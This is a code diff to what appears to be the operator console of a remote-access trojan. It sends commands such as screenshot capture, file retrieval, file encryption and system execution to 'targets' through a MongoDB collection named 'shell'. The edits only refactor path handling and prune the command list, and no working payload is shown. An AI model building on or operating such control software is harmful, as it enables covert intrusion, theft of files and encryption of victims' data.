@@ -26,7 +26,7 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['targetlist','shifttarget','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
+MY_COMMANDS=['targetlist','shifttarget','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
 IGNORE_COMMANDS_ON_NETWORK=['targetlist','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver']
 
 CWD=r""
@@ -352,7 +352,9 @@ def is_directory_change_command():
                 print("invalid navigate")
             else:
                 if CWD and CWD[len(CWD)-1]!='\\':
-                    a[1]='\\'+target_strings(a=a,index=1)                
+                    a[1]='\\'+target_strings(a=a,index=1)
+                else:
+                    a[1]=target_strings(a=a,index=1)             
                 CWD=CWD+f'{a[1]}'
                 LAST_PATH=f'{a[1]}'
         elif a[0]=='cd..':
@@ -594,9 +596,8 @@ def ActionUploader():
                 elif len(a)>=3:
                     if a[0]=='updatefile':
                         target_element=a[1]
-                        target_string=""
-                        for i in range(2,len(a)):
-                            target_string=target_string+a[i]+" "
+                        target_string=target_strings(a,2)
+                        print(target_string,target_element)
                         data={
                             "action":action,
                             "target":target,
@@ -688,12 +689,8 @@ def shell():
                     clearCollection()
                     STOP=True
                     break
-                #if STATUS=='Online' or command=='targetlist' or command=='shifttarget' or command=='commands':
                 is_directory_change_command()
                 ActionUploader()
-               #else:
-                    #print(Fore.CYAN+">>> ")
-                    #print(Fore.CYAN+f"Target is Offline mode")
 
         except Exception as e:
                 print(e)
